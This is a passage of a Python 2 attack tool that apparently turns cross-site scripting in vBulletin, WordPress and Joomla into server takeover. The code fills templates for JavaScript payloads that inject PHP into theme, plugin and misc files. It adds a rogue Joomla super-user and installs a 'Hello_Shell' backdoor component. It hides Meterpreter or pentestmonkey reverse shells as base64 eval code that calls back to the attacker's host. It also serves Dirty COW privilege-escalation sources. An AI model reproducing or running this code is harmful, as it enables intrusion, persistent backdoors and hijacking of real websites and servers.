                            # activateshell=true'+fontcolors.ENDC+'", to activate the payload.'
                            if joomla_username is not "NOT_APPLICABLE":
                                print ' [!] Your username is: ' + FontColors.BLUE + FontColors.BOLD + \
                                      joomla_username + FontColors.ENDC + ' '
                            if joomla_password is not "NOT_APPLICABLE":
                                print ' [!] Your password is: ' + FontColors.BLUE + FontColors.BOLD + \
                                      joomla_password + FontColors.ENDC + ' '
                            # TODO: Backdoor filename should be dynamic in the future.
                            print ' [!] Backdoor Link: http://{}:{}/Hello_Shell.zip'.format(localhost, http_port)
                            print ' [+] DCOW (SUID) 32-bit src is available at: http://{}:{}/dcow32.c'.format(
                                  localhost, http_port)
                            print ' [+] DCOW (SUID) 64-bit src is available at: http://{}:{}/dcow64.c'.format(
                                  localhost, http_port)
                            print ' [?] Press CTRL+C to stop the server and exit the script. \n'
                            print '-------------- HTTP Requests Below --------------'
                            server.serve_forever()
                        except KeyboardInterrupt:
                            # server.socket.close()
                            exit_xsser()
                    else:
                        print " [!] The web server handled the 400 error page, meaning the injection did not " \
                              "occur within Joomla SecurityCheck."
            except Exception as error:
                print " [!] An error occurred: {}\n [!] Shutting down.".format(error)
                traceback.print_exc()
                # print "Localhost variable: {}".format(localhost)  # DEBUG
                exit_xsser(1)
        except KeyboardInterrupt:
            print FontColors.YELLOW + "\n [!] CTRL+C detected, shutting down." + FontColors.ENDC
            exit_xsser(1)
    else:
        print " [!] Invalid exploit, quitting."
        exit_xsser()


# Update JavaScript payload
def update_javascript_payload(payload_type, php_input):
    global target_hostname  # Version 2.5 Messy Fix
    global http_port
    global joomla_username
    global joomla_password
    target_hostname = ''
    payload_file = ''
    try:
        if payload_type == 'vb_misc':
            payload_file = open("Payloads/javascript/vbulletin_legacy.js")  # Misc_Start vBulletin Hook (misc.php)
        elif payload_type == 'wpseo':
            payload_file = open("Payloads/javascript/wordpress_legacy.js")  # WPSEO (robots.txt and .htaccess)
            # Version 2.5 messy fix for callback in JS files for WordPress - Clean up later
            # TODO: Ask for the full URL with HTTP or HTTPS.
            print " [?] Enter the target hostname/FQDN\n [?] e.g. www.target.com.au"
            target_hostname = raw_input(" [?] Hostname: ").strip(" ")
        elif payload_type == 'wp_footer_theme':
            payload_file = open("Payloads/javascript/wordpress_theme.js")  # WordPress Core Theme (footer.php)
            # Version 2.5 messy fix for TARGETWEBSITE in JS files
            print " [?] Enter the target hostname/FQDN\n [?] e.g. www.target.com.au"
            target_hostname = raw_input(" [?] Hostname: ").strip(" ")
        elif payload_type == 'wp_hello_plugin':
            payload_file = open("Payloads/javascript/wordpress_plugin.js")  # WordPress Core Plugin (hello.php)
            # Version 2.5 messy fix for TARGETWEBSITE in JS files
            # TODO: Make this into a function like target_hostname = ask_for_target()
            print " [?] Enter the target hostname/FQDN\n [?] e.g. www.target.com.au"
            target_hostname = raw_input(" [?] Hostname: ").strip(" ")
        elif payload_type == 'add_new_admin':
            print " [?] Enter the target hostname/FQDN\n [?] e.g. www.target.com.au"
            target_hostname = raw_input(" [?] Hostname: ").strip(" ")
            # global joomla_username
            # global joomla_password
            payload_file = open("Payloads/javascript/joomla_admin.js")  # Joomla - Add New Super User (admin)
            prompt1 = raw_input(" [?] Enter shown name: ")
            prompt2 = raw_input(" [?] Enter a username: ")
            prompt3 = raw_input(" [?] Enter a password: ")
            prompt4 = raw_input(" [?] Enter an email  : ")
            joomla_username = prompt2
            joomla_password = prompt3
            #  TODO: Consider simplifying this
            # https://stackoverflow.com/questions/6116978/how-to-replace-multiple-substrings-of-a-string
            prompt1_reg = re.compile('(VAR_SHOWN_NAME)')
            prompt2_reg = re.compile('(VAR_USER_NAME)')
            prompt3a_reg = re.compile('(VAR_PASSWORD_1)')
            prompt3b_reg = re.compile('(VAR_PASSWORD_2)')
            prompt4_reg = re.compile('(VAR_EMAIL)')
            stage1 = prompt1_reg.sub(prompt1, payload_file.read())
            stage2 = prompt2_reg.sub(prompt2, stage1)
            stage3a = prompt3a_reg.sub(prompt3, stage2)
            stage3b = prompt3b_reg.sub(prompt3, stage3a)
            stage4 = prompt4_reg.sub(prompt4, stage3b)
            callbackhost_reg = re.compile('(CALLBACKHOST)')
            callbackport_reg = re.compile('(CALLBACKPORT)')
            stage5 = callbackhost_reg.sub(lhost, stage4)
            stage6 = callbackport_reg.sub("80", stage5)
            #  TODO: End of major future rewrite.
            return stage6  # Need to return early for this exploit/payload
        # NEW JOOMLA PAYLOAD
        elif payload_type == 'install_backdoor':
            print " [?] Enter the target hostname/FQDN\n [?] e.g. www.target.com.au"
            target_hostname = raw_input(" [?] Hostname: ").strip(" ")
            # global joomla_username
            # global joomla_password
            joomla_username = "NOT_APPLICABLE"
            joomla_password = "NOT_APPLICABLE"
            payload_file = open("Payloads/javascript/joomla_backdoor.js")
            # TODO: The user should be allowed to select meterpreter for the Joomla backdoor, and
            # TODO: in that case, also make the payload 100% automatic like the others.
            # TODO: Consider adding new WordPress payloads that add new themes/plugins with
            # TODO: automatic self-removal upon exit.
            print " [*] Using semi-automatic Joomla backdoor. \n" \
                  " [*] Example: /index.php?option=com_helloshell&c64=bHMgLWFs \n" \
                  " [*] Example: /index.php?option=com_helloshell&c=ls"
            attacker_url = "http://{}:{}/{}".format(lhost, "80", "Hello_Shell.zip")
            # TODO: Listening port and filename should be dynamic in the future.
            # print " DEBUG: Attacker URL: %s" % attacker_url
            # TODO: Another important future rewrite
            prompt0_reg = re.compile('(VAR_BACKDOOR_URL)')
            stage1 = prompt0_reg.sub(attacker_url, payload_file.read())
            callbackhost_reg = re.compile('(CALLBACKHOST)')
            callbackport_reg = re.compile('(CALLBACKPORT)')
            stage2 = callbackhost_reg.sub(lhost, stage1)
            stage3 = callbackport_reg.sub("80", stage2)
            # End major rewrite.
            return stage3
        else:
            print " [!] Invalid payload, quitting."
            exit_xsser()
        http_port = "80"  # Port to listen on. Does not really need to be dynamic at the moment.
        # TODO: Future section rewrite
        payload_replace = re.compile('(PHP_PAYLOAD)')
        payload_stage1 = payload_replace.sub(php_input, payload_file.read())
        hostname_replace = re.compile('(TARGETWEBSITE)')
        payload_stage2 = hostname_replace.sub(target_hostname, payload_stage1)
        callbackhost_replace = re.compile('(CALLBACKHOST)')
        payload_stage3 = callbackhost_replace.sub(lhost, payload_stage2)
        callbackport_replace = re.compile('(CALLBACKPORT)')
        payload_stage4 = callbackport_replace.sub(http_port, payload_stage3)
        # End section rewrite.
        return payload_stage4
    except KeyboardInterrupt:
        print FontColors.YELLOW + "\n [!] CTRL+C detected, shutting down." + FontColors.ENDC
        exit_xsser()


# Choose IP address to listen on and update PHP payload
# TODO: Optimize in a future version
def prepare_payload(option):
    try:
        global lhost
        global lport
        global_ip_address = get_local_ip()
        if option == 'meterpreter':
            prepare_payload_banner()
            use_local_ip = raw_input(" [?] Would you like to use the following IP: {}? (y/n) "
                                     .format(get_colored_ip(global_ip_address)))
            if use_local_ip == "y":
                lhost = global_ip_address
            if use_local_ip == "n":
                lhost = raw_input(" [?] Enter a listening IP: ")
            lport = raw_input(" [?] Enter a listening port: ")
            payload_shell = open('Shells/meterpreter/meterpreter.php')
            find_host = re.compile('(LOCALHOST)')
            add_host = find_host.sub(lhost, payload_shell.read())
            find_port = re.compile('(LOCALPORT)')
            add_port = find_port.sub(lport, add_host)
            stripspace = re.compile('[\t\n\r]')
            filepart2 = stripspace.sub('', add_port)
            payload_input_shell = "if($_GET['activateshell']=='true') {{ {} }} ".format(filepart2)
            payload_insert = "eval(base64_decode(\"" + base64.b64encode(payload_input_shell) + "\"));"
            return payload_insert
        elif option == 'pentestmonkey':
            prepare_payload_banner()
            use_local_ip = raw_input(" [?] Would you like to use the following IP: {}? (y/n) "
                                     .format(get_colored_ip(global_ip_address)))
            if use_local_ip == "y":
                lhost = global_ip_address
            if use_local_ip == "n":
                lhost = raw_input(" [?] Enter a listening IP: ")
            lport = raw_input(" [?] Enter a listening port: ")
            payload_shell = open('Shells/php-reverse-shell-1.0/php-reverse-shell.php')
            find_host = re.compile('(LOCALHOST)')
            add_host = find_host.sub(lhost, payload_shell.read())
            find_port = re.compile('(LOCALPORT)')
            add_port = find_port.sub(lport, add_host)
            stripcomments = re.compile('//.*?\n|/\*.*?\*/')
            filepart1 = stripcomments.sub('', add_port)
            stripspace = re.compile('[\t\n]')
            filepart2 = stripspace.sub('', filepart1)
            payload_input_shell = "if($_GET['activateshell']=='true') {{ {} }} ".format(filepart2)
            payload_insert = "eval(base64_decode(\"" + base64.b64encode(payload_input_shell) + "\"));"
            return payload_insert
        elif option == 'pentestmonkey_notify':
            prepare_payload_banner()
            use_local_ip = raw_input(" [?] Would you like to use the following IP: {}? (y/n) "
                                     .format(get_colored_ip(global_ip_address)))
            if use_local_ip == "y":
                lhost = global_ip_address
            if use_local_ip == "n":
                lhost = raw_input(" [?] Enter a listening IP: ")
            lport = raw_input(" [?] Enter a listening port: ")
            payload_shell = open('Shells/php-reverse-shell-1.0/php-reverse-shell-notify.php')
            find_host = re.compile('(LOCALHOST)')
            add_host = find_host.sub(lhost, payload_shell.read())
            find_port = re.compile('(LOCALPORT)')
            add_port = find_port.sub(lport, add_host)
            stripcomments = re.compile('//.*?\n|/\*.*?\*/')
            filepart1 = stripcomments.sub('', add_port)
            stripspace = re.compile('[\t\n]')
            filepart2 = stripspace.sub('', filepart1)
            payload_input_shell = "if($_GET['activateshell']=='true') {{ {} }} ".format(filepart2)
            payload_insert = "eval(base64_decode(\"" + base64.b64encode(payload_input_shell) + "\"));"
            return payload_insert
        elif option == 'payload_not_specified':
            prepare_payload_banner()
            payload_insert = " "
            lport = 4321
            use_local_ip = raw_input(" [?] Would you like to use the following IP: {}? (y/n) "
                                     .format(get_colored_ip(global_ip_address)))
            if use_local_ip == "y":
                lhost = global_ip_address
            if use_local_ip == "n":
                lhost = raw_input(" [?] Enter a listening IP: ")
            return payload_insert
        else:
            print " [!] Invalid payload, quitting."
            exit_xsser()
    except KeyboardInterrupt:
        print FontColors.YELLOW + "\n [!] CTRL+C detected, shutting down." + FontColors.ENDC
        exit_xsser()


# ====================== #
#    MENU DEFINITIONS
# ====================== #

# Menu definition
menu_actions = {
    'main_menu': main_menu,
    '1': menu1,
    '2': menu2,
    '3': menu3,
    '9': back,
    'q': exit_xsser,
}

vbulletin_menu = {
    '1': vbmenu1,
    '9': back,
    'q': exit_xsser,
}

wordpress_menu = {
    '1': wpmenu1,
    '2': wpmenu2,
    '3': wpmenu3,
    '9': back,
    'q': exit_xsser,
}

joomla_menu = {
    '1': jmenu1,
    '2': jmenu2,
    '9': back,
    'q': exit_xsser,
}

payload_menu = {
    '1': meterpreter,
    '2': pentestmonkey,
    '3': pentestmonkey_notify,
    '5': payload_not_specified,
    '9': back,
    'q': exit_xsser,
}
 
# ====================== #
#      MAIN PROGRAM
# ====================== #
 
# Main Program
if __name__ == "__main__":
    # Generate the hello_shell.zip file
    generate_helloshell()
    # Make the js_alert.sh file executable
    enable_js_alert()
    # Launch the main menu
    main_menu()
